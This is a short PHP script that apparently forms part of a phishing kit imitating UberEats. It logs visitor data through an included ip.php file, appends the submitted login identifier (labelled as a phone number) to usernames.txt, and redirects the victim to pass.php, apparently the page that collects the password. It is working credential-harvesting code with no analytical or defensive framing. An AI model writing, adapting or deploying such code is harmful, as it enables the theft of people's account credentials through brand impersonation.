<?php
include 'ip.php';
file_put_contents("usernames.txt", "UberEats Phone Number : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: pass.php');
?>
